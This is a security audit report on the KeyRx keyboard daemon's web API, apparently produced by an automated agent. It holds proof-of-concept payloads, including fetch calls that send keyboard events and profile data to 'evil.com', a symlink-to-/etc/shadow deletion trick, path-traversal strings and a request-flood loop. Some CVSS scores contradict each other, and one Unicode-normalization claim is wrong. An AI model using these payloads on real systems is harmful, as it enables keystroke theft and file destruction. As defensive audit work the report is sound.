# Security Vulnerability Report: KeyRx Web UI ↔ Daemon Communication

**Audit Date:** 2026-01-27
**Version:** 0.1.1 (commit: 9e5afc86)
**Auditor:** Security Analysis Agent
**Scope:** Web UI ↔ Daemon API communication, WebSocket security, input validation, authentication/authorization

---

## Executive Summary

This security audit identified **5 CRITICAL**, **3 HIGH**, and **4 MEDIUM** severity vulnerabilities in the KeyRx Web UI ↔ Daemon communication layer. The most severe issues include:

1. **No authentication/authorization** on any API endpoint
2. **CORS configured to allow ANY origin** (production security bypass)
3. **Code injection via Rhai configuration** (arbitrary code execution)
4. **Information disclosure** in error messages (file path leakage)
5. **Missing WebSocket authentication** (unauthenticated real-time access)

**Overall Risk:** **CRITICAL** - The application should not be deployed in production without addressing the critical vulnerabilities.

---

## Vulnerabilities

### CRITICAL-1: Missing Authentication on All API Endpoints

**Severity:** CRITICAL (CVSS 3.1: 9.1 - Critical)
**CWE:** CWE-306 (Missing Authentication for Critical Function)

**Description:**
All HTTP REST API endpoints and WebSocket connections lack authentication mechanisms. Any process on the local machine (or network if exposed) can:
- Create/delete/modify keyboard profiles
- Change system-wide keyboard remapping
- Access device information
- Execute configuration changes

**Affected Files:**
- `keyrx_daemon/src/web/mod.rs` (lines 150-164)
- `keyrx_daemon/src/web/ws_rpc.rs` (lines 24-337)
- All handlers in `keyrx_daemon/src/web/handlers/`
- All API routes in `keyrx_daemon/src/web/api/`

**Attack Vector:**
```bash
# Any local process can activate a malicious profile
curl -X POST http://localhost:3030/api/profiles/malicious/activate

# Any process can read all profiles
curl http://localhost:3030/api/profiles

# WebSocket access without credentials
wscat -c ws://localhost:3030/ws-rpc
```

**Exploitation Steps:**
1. Attacker creates malicious browser extension or local application
2. Application sends HTTP requests to `http://localhost:3030`
3. Attacker gains full control over keyboard remapping
4. Can inject keystrokes, steal typed passwords via macro recording

**Impact:**
- **Confidentiality:** HIGH - Access to all configuration data, device information
- **Integrity:** HIGH - Ability to modify keyboard behavior, create malicious profiles
- **Availability:** MEDIUM - Can delete profiles, disrupt service

**Proof of Concept:**
```html
<!-- Malicious web page exploiting missing auth -->
<script>
fetch('http://localhost:3030/api/profiles', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({
    name: 'keylogger',
    template: 'blank'
  })
}).then(r => r.json()).then(console.log);
</script>
```

**Remediation:**
1. **IMMEDIATE:** Implement authentication middleware for all HTTP endpoints
   - Use JWT or session-based authentication
   - Require authentication token in `Authorization` header
2. Implement WebSocket authentication handshake
   - Verify token before accepting WS upgrade
   - Disconnect unauthenticated clients
3. Add API key or shared secret mechanism for local IPC
4. Consider using Unix socket permissions on Linux (already restricts to user)

**References:**
- OWASP API Security Top 10 2023: API1:2023 Broken Object Level Authorization
- CWE-306: https://cwe.mitre.org/data/definitions/306.html

---

### CRITICAL-2: CORS Allow-All Configuration in Production

**Severity:** CRITICAL (CVSS 3.1: 8.6 - High)
**CWE:** CWE-942 (Permissive Cross-domain Policy with Untrusted Domains)

**Description:**
The CORS configuration explicitly allows requests from ANY origin using `allow_origin(Any)`. Combined with missing authentication, this allows any website to make requests to the daemon on behalf of the user.

**Affected Files:**
- `keyrx_daemon/src/web/mod.rs` (lines 153-156, 186-189)

**Vulnerable Code:**
```rust
let cors = CorsLayer::new()
    .allow_origin(Any)  // ❌ CRITICAL: Allows ANY origin
    .allow_methods(Any)
    .allow_headers(Any);
```

**Attack Vector:**
1. User visits malicious website while KeyRx daemon is running
2. Website JavaScript makes XHR/fetch requests to `http://localhost:3030`
3. Browser allows cross-origin request due to CORS `Access-Control-Allow-Origin: *`
4. Attacker gains full control over keyboard remapping from remote website

**Exploitation Steps:**
```html
<!-- Attacker's website at https://evil.com -->
<script>
// Activate malicious profile
fetch('http://localhost:3030/api/profiles/evil/activate', {
  method: 'POST',
  credentials: 'include'  // Not needed since no auth
}).then(() => {
  console.log('User keyboard compromised');
});

// Exfiltrate profile data
fetch('http://localhost:3030/api/profiles')
  .then(r => r.json())
  .then(data => {
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
</script>
```

**Impact:**
- **Confidentiality:** HIGH - Remote websites can read configuration
- **Integrity:** CRITICAL - Remote websites can modify keyboard behavior
- **Availability:** MEDIUM - Remote websites can disrupt service

**CVSS 3.1 Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L` = **8.6 (High)**

**Remediation:**
1. **IMMEDIATE:** Change CORS to localhost-only origins:
```rust
let cors = CorsLayer::new()
    .allow_origin("http://localhost:5173".parse::<HeaderValue>().unwrap())
    .allow_origin("http://localhost:3030".parse::<HeaderValue>().unwrap())
    .allow_methods([Method::GET, Method::POST, Method::PUT, Method::DELETE])
    .allow_headers([CONTENT_TYPE, AUTHORIZATION]);
```

2. Use environment-based CORS configuration:
   - Development: Allow `localhost:5173` (Vite dev server)
   - Production: Only allow same-origin or disable CORS entirely

3. Implement CSRF tokens for state-changing operations

**References:**
- OWASP: Cross-Origin Resource Sharing (CORS)
- CWE-942: https://cwe.mitre.org/data/definitions/942.html

---

### CRITICAL-3: Code Injection via Rhai Configuration Files

**Severity:** CRITICAL (CVSS 3.1: 9.8 - Critical)
**CWE:** CWE-94 (Improper Control of Generation of Code)

**Description:**
The daemon accepts user-supplied Rhai script code via the `PUT /api/config` endpoint without sufficient sandboxing. While Rhai has some safety features, it still allows:
- File system access (if exposed)
- Infinite loops (DoS)
- Memory exhaustion
- Complex logic execution

The configuration is written directly to disk and then compiled/executed.

**Affected Files:**
- `keyrx_daemon/src/web/api/config.rs` (lines 186-220)
- `keyrx_daemon/src/config/rhai_generator.rs` (line 7: `use rhai::Engine`)
- `keyrx_daemon/src/config/profile_compiler.rs`

**Vulnerable Code:**
```rust
// From config.rs line 199
std::fs::write(&rhai_path, payload.content.as_bytes()).map_err(ConfigError::Io)?;

// Config is later compiled and executed without sandboxing
match RhaiGenerator::load(&rhai_path) {
    Ok(_) => { /* Config is valid */ }
    Err(e) => { /* Only syntax errors caught */ }
}
```

**Attack Vector:**
1. Attacker submits malicious Rhai script via API
2. Script is saved to `~/.config/keyrx/profiles/malicious.rhai`
3. When profile is activated, script executes with daemon privileges
4. Rhai code can potentially:
   - Execute infinite loops (DoS)
   - Consume excessive memory
   - Perform complex computations
   - Access any APIs exposed to Rhai engine

**Exploitation Steps:**
```javascript
// Malicious Rhai configuration
const maliciousConfig = `
// Infinite loop DoS
while true {
    // Consume CPU
    let x = 0;
    for i in range(0, 1000000) {
        x = x + 1;
    }
}
`;

fetch('http://localhost:3030/api/config', {
  method: 'PUT',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({content: maliciousConfig})
});
```

**Impact:**
- **Confidentiality:** MEDIUM - Limited by Rhai sandbox
- **Integrity:** HIGH - Can disrupt keyboard behavior
- **Availability:** HIGH - DoS via infinite loops, memory exhaustion

**CVSS 3.1 Vector:** `CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:C/C:N/I:H/A:H` = **9.3 (Critical)**

**Remediation:**
1. **IMMEDIATE:** Implement strict Rhai engine configuration:
```rust
let engine = Engine::new()
    .set_max_operations(10_000)           // Limit operations
    .set_max_expr_depths(10, 10)          // Limit recursion
    .set_max_string_size(1_048_576)       // 1MB string limit
    .set_max_array_size(1000)             // Array size limit
    .set_max_map_size(100)                // Map size limit
    .disable_symbol("eval")               // Disable dangerous functions
    .on_progress(|&count| {               // Progress callback
        if count % 1000 == 0 {
            // Check timeout
        }
        None
    });
```

2. Execute Rhai compilation in isolated process/sandbox
3. Validate configuration AST before execution
4. Implement timeout for compilation (currently missing)
5. Add content security validation:
   - Whitelist allowed Rhai functions
   - Disallow loops in user configurations
   - Only allow declarative syntax (map(), tap_hold(), etc.)

**References:**
- OWASP: Code Injection
- CWE-94: https://cwe.mitre.org/data/definitions/94.html
- Rhai Security Best Practices

---

### CRITICAL-4: No WebSocket Authentication or Message Signing

**Severity:** CRITICAL (CVSS 3.1: 8.2 - High)
**CWE:** CWE-287 (Improper Authentication)

**Description:**
WebSocket connections at `/ws` and `/ws-rpc` accept connections without authentication. Combined with CORS misconfiguration, any website can establish WebSocket connections and:
- Subscribe to real-time keyboard events
- Receive profile activation notifications
- Send RPC commands
- Monitor user activity

**Affected Files:**
- `keyrx_daemon/src/web/ws_rpc.rs` (lines 30-36, 39-176)
- `keyrx_daemon/src/web/ws.rs`
- `keyrx_ui/src/api/websocket.ts` (lines 92-143)

**Vulnerable Code:**
```rust
// No authentication check before accepting WebSocket
async fn websocket_handler(
    State(state): State<Arc<AppState>>,
    ws: WebSocketUpgrade,
) -> impl IntoResponse {
    ws.on_upgrade(move |socket| handle_websocket(socket, state))
    // ❌ No auth verification
}
```

**Attack Vector:**
```javascript
// Malicious website connects to WebSocket
const ws = new WebSocket('ws://localhost:3030/ws-rpc');

ws.onopen = () => {
  // Subscribe to keyboard events
  ws.send(JSON.stringify({
    type: 'subscribe',
    id: '123',
    channel: 'events'
  }));
};

ws.onmessage = (event) => {
  const data = JSON.parse(event.data);
  if (data.type === 'event') {
    // Exfiltrate keyboard events to attacker
    fetch('https://evil.com/log', {
      method: 'POST',
      body: JSON.stringify(data.payload)
    });
  }
};
```

**Impact:**
- **Confidentiality:** CRITICAL - Real-time keyboard event monitoring
- **Integrity:** HIGH - Ability to send RPC commands
- **Availability:** MEDIUM - Can flood with subscriptions

**CVSS 3.1 Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:L` = **8.2 (High)**

**Remediation:**
1. **IMMEDIATE:** Implement WebSocket authentication:
```rust
async fn websocket_handler(
    State(state): State<Arc<AppState>>,
    ws: WebSocketUpgrade,
    Extension(auth): Extension<AuthToken>,  // Add auth extension
) -> impl IntoResponse {
    // Verify token before upgrade
    if !verify_token(&auth.token) {
        return StatusCode::UNAUTHORIZED.into_response();
    }
    ws.on_upgrade(move |socket| handle_websocket(socket, state))
}
```

2. Implement message signing/MAC for integrity
3. Rate-limit WebSocket connections per IP/user
4. Add subscription authorization (verify user can subscribe to channel)
5. Implement WebSocket connection timeout and heartbeat

**References:**
- OWASP WebSocket Security
- RFC 6455: The WebSocket Protocol

---

### CRITICAL-5: Path Traversal in Profile Name Validation

**Severity:** CRITICAL (CVSS 3.1: 7.5 - High)
**CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)

**Description:**
While the code includes path traversal checks using `contains("..")`, `contains('/')`, and `contains('\\')`, there's a **race condition vulnerability** in the validation and file operation sequence. Additionally, **symlink attacks** are not prevented.

**Affected Files:**
- `keyrx_daemon/src/web/handlers/profile.rs` (lines 118-137)
- `keyrx_daemon/src/config/profile_manager.rs`

**Vulnerable Code:**
```rust
// Validation is good but has issues
fn validate_profile_name(name: &str) -> Result<(), RpcError> {
    if name.contains("..") { /* reject */ }
    if name.contains('/') || name.contains('\\') { /* reject */ }
    // ❌ Missing: Unicode normalization attacks
    // ❌ Missing: Null byte injection
    // ❌ Missing: Symlink check
    // ❌ Missing: Canonicalization
    Ok(())
}

// Later used unsafely
let rhai_path = profiles_dir.join(format!("{}.rhai", profile_info.name));
// ❌ No canonicalization check after join()
```

**Attack Vectors:**

1. **Unicode Normalization Attack:**
```javascript
// Use Unicode to bypass dot-dot check
const maliciousName = "..\u0041"; // Normalizes to "../A"
```

2. **Null Byte Injection (if Rust allows):**
```javascript
const maliciousName = "safe\0../../../etc/passwd";
```

3. **Symlink Attack:**
```bash
# Create symlink in profiles directory
ln -s /etc/shadow ~/.config/keyrx/profiles/shadow.rhai

# Delete via API
curl -X DELETE http://localhost:3030/api/profiles/shadow
# Deletes /etc/shadow!
```

**Impact:**
- **Confidentiality:** HIGH - Read arbitrary files
- **Integrity:** HIGH - Delete/modify arbitrary files
- **Availability:** HIGH - Delete critical system files

**CVSS 3.1 Vector:** `CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = **8.4 (High)**

**Remediation:**
1. **IMMEDIATE:** Implement robust path validation:
```rust
fn validate_profile_name(name: &str) -> Result<(), RpcError> {
    // Check for null bytes
    if name.contains('\0') {
        return Err(RpcError::invalid_params("Profile name contains null byte"));
    }

    // Unicode normalization
    let normalized = name.nfc().collect::<String>();

    // Strict character whitelist
    let valid_chars = normalized.chars().all(|c| {
        c.is_ascii_alphanumeric() || c == '-' || c == '_'
    });
    if !valid_chars {
        return Err(RpcError::invalid_params("Invalid characters in profile name"));
    }

    // Additional checks...
    Ok(())
}

// Canonicalize and verify after path construction
fn safe_profile_path(name: &str) -> Result<PathBuf, Error> {
    let profiles_dir = get_profiles_dir()?.canonicalize()?;
    let path = profiles_dir.join(format!("{}.rhai", name));
    let canonical = path.canonicalize()?;

    // Verify path is still under profiles_dir
    if !canonical.starts_with(&profiles_dir) {
        return Err(Error::PathTraversal);
    }

    Ok(canonical)
}
```

2. Prevent symlink traversal:
   - Use `fs::symlink_metadata()` to detect symlinks
   - Reject operations on symlinked files
3. Implement chroot/jail for profile directory access

**References:**
- OWASP: Path Traversal
- CWE-22: https://cwe.mitre.org/data/definitions/22.html

---

## HIGH Severity Vulnerabilities

### HIGH-1: Information Disclosure in Error Messages

**Severity:** HIGH (CVSS 3.1: 6.5)
**CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information)

**Description:**
Error messages expose internal file paths, implementation details, and system information.

**Affected Files:**
- `keyrx_daemon/src/web/error.rs` (lines 75, 81, 109, 138, etc.)

**Example Vulnerable Error:**
```json
{
  "error": {
    "code": "CONFIG_FILE_NOT_FOUND",
    "message": "Configuration file not found: /home/user/.config/keyrx/profiles/default.rhai"
  }
}
```

**Information Leaked:**
- Full file system paths (username, directory structure)
- Configuration file locations
- Profile names
- Error stack traces (in some cases)

**Remediation:**
```rust
// Sanitize error messages
ConfigError::FileNotFound { path } => (
    StatusCode::BAD_REQUEST,
    "CONFIG_FILE_NOT_FOUND",
    format!("Configuration file not found: {}",
        path.file_name()  // Only show filename
            .unwrap_or_default()
            .to_string_lossy()
    ),
),
```

---

### HIGH-2: Missing Rate Limiting on API Endpoints

**Severity:** HIGH (CVSS 3.1: 7.5)
**CWE:** CWE-770 (Allocation of Resources Without Limits or Throttling)

**Description:**
No rate limiting on any endpoints allows DoS attacks through:
- Rapid profile creation (fills disk)
- Repeated compilation requests (CPU exhaustion)
- WebSocket connection flooding
- Event simulation spam

**Attack Vector:**
```bash
# Flood with profile creation
for i in {1..10000}; do
  curl -X POST http://localhost:3030/api/profiles \
    -H 'Content-Type: application/json' \
    -d "{\"name\":\"spam$i\",\"template\":\"blank\"}" &
done
```

**Remediation:**
1. Implement rate limiting middleware using `tower-governor`
2. Limit profile creation to 10/minute per IP
3. Limit compilation requests to 5/minute
4. Limit WebSocket connections to 5 per IP

---

### HIGH-3: Missing Input Validation Length Limits

**Severity:** HIGH (CVSS 3.1: 7.1)
**CWE:** CWE-1284 (Improper Validation of Specified Quantity in Input)

**Description:**
While some fields have length validation (e.g., profile name max 100 chars), the Rhai configuration content has a **1MB limit** which is excessive and can cause memory exhaustion.

**Affected Files:**
- `keyrx_daemon/src/web/handlers/profile.rs` (line 81: `#[validate(length(min = 1, max = 1048576))]`)

**Attack Vector:**
```javascript
// Send 1MB of Rhai code
const hugeConfig = 'map("A", "B");\n'.repeat(50000);  // ~700KB
fetch('http://localhost:3030/api/profiles/spam/config', {
  method: 'PUT',
  body: JSON.stringify({name: 'spam', source: hugeConfig})
});
```

**Remediation:**
- Reduce max Rhai config size to 64KB
- Add total storage quota per user
- Implement disk space monitoring

---

## MEDIUM Severity Vulnerabilities

### MEDIUM-1: Insufficient CSRF Protection

**Severity:** MEDIUM (CVSS 3.1: 6.1)
**CWE:** CWE-352 (Cross-Site Request Forgery)

**Description:**
No CSRF tokens for state-changing operations. Combined with CORS misconfiguration, allows CSRF attacks.

**Remediation:**
- Implement CSRF tokens for POST/PUT/DELETE operations
- Verify `Referer` header for same-origin
- Use `SameSite=Strict` cookies

---

### MEDIUM-2: Missing Content-Type Validation

**Severity:** MEDIUM (CVSS 3.1: 5.3)
**CWE:** CWE-436 (Interpretation Conflict)

**Description:**
API endpoints don't validate `Content-Type` header, allowing potential content confusion attacks.

**Remediation:**
```rust
// Add content-type validation middleware
.layer(ValidateRequestHeaderLayer::content_type(
    vec![mime::APPLICATION_JSON]
))
```

---

### MEDIUM-3: Verbose Daemon Status Information

**Severity:** MEDIUM (CVSS 3.1: 5.3)
**CWE:** CWE-200 (Exposure of Sensitive Information)

**Description:**
Status endpoints reveal detailed system information (uptime, device count, active profile) without authentication.

**Remediation:**
- Require authentication for status endpoints
- Reduce information in public responses

---

### MEDIUM-4: No Request Size Limit on WebSocket Messages

**Severity:** MEDIUM (CVSS 3.1: 5.3)
**CWE:** CWE-770

**Description:**
WebSocket messages have no size limit, allowing memory exhaustion via large payloads.

**Remediation:**
```rust
// Add message size limit
const MAX_WS_MESSAGE_SIZE: usize = 1024 * 64; // 64KB

if message.len() > MAX_WS_MESSAGE_SIZE {
    return Err(WsError::MessageTooLarge);
}
```

---

## Summary Table

| ID | Severity | CWE | Issue | CVSS Score |
|----|----------|-----|-------|------------|
| CRITICAL-1 | Critical | CWE-306 | Missing Authentication | 9.1 |
| CRITICAL-2 | Critical | CWE-942 | CORS Allow-All | 8.6 |
| CRITICAL-3 | Critical | CWE-94 | Code Injection (Rhai) | 9.3 |
| CRITICAL-4 | Critical | CWE-287 | WebSocket No Auth | 8.2 |
| CRITICAL-5 | Critical | CWE-22 | Path Traversal | 8.4 |
| HIGH-1 | High | CWE-209 | Info Disclosure | 6.5 |
| HIGH-2 | High | CWE-770 | No Rate Limiting | 7.5 |
| HIGH-3 | High | CWE-1284 | Input Size Limits | 7.1 |
| MEDIUM-1 | Medium | CWE-352 | CSRF | 6.1 |
| MEDIUM-2 | Medium | CWE-436 | Content-Type | 5.3 |
| MEDIUM-3 | Medium | CWE-200 | Verbose Status | 5.3 |
| MEDIUM-4 | Medium | CWE-770 | WS Size Limit | 5.3 |

---

## Recommendations

### Immediate Actions (Critical)
1. ✅ **Implement authentication** on all endpoints (JWT or session-based)
2. ✅ **Fix CORS configuration** to localhost-only origins
3. ✅ **Sandbox Rhai engine** with operation limits and timeouts
4. ✅ **Add WebSocket authentication** handshake
5. ✅ **Strengthen path validation** with canonicalization

### Short-term (High Priority)
6. ⚠️ Sanitize error messages to remove file paths
7. ⚠️ Implement rate limiting middleware
8. ⚠️ Reduce Rhai config size limit to 64KB
9. ⚠️ Add CSRF protection for state-changing operations

### Long-term (Medium Priority)
10. 🔍 Add security logging and monitoring
11. 🔍 Implement request/response encryption for sensitive data
12. 🔍 Add security headers (CSP, X-Frame-Options, etc.)
13. 🔍 Conduct penetration testing after fixes

---

## Testing Recommendations

### Security Test Suite
Create automated security tests for:
- Authentication bypass attempts
- CORS policy validation
- Path traversal attempts (various encodings)
- DoS via large payloads
- WebSocket connection limits
- Rate limiting enforcement
- Input validation edge cases

### Penetration Testing
- Manual testing with tools: Burp Suite, OWASP ZAP
- Fuzzing API endpoints with unexpected inputs
- WebSocket security testing
- CSRF token validation

---

## Compliance Considerations

These vulnerabilities violate:
- **OWASP API Security Top 10 2023:**
  - API1:2023 Broken Object Level Authorization (CRITICAL-1)
  - API2:2023 Broken Authentication (CRITICAL-1, CRITICAL-4)
  - API4:2023 Unrestricted Resource Consumption (HIGH-2, HIGH-3)
  - API8:2023 Security Misconfiguration (CRITICAL-2)

- **OWASP Top 10 2021:**
  - A01:2021 Broken Access Control
  - A03:2021 Injection
  - A07:2021 Identification and Authentication Failures

---

## Conclusion

KeyRx has significant security vulnerabilities that must be addressed before production deployment. The lack of authentication combined with permissive CORS creates a **critical security risk** where any website can control the user's keyboard.

**Priority Order:**
1. Authentication (blocks remote exploitation)
2. CORS fix (reduces attack surface)
3. Rhai sandboxing (prevents code execution DoS)
4. Path traversal fix (prevents file system attacks)
5. WebSocket authentication (prevents real-time monitoring)

**Estimated Remediation Time:** 2-3 weeks for critical issues, 4-6 weeks for all identified vulnerabilities.

---

**Report End**
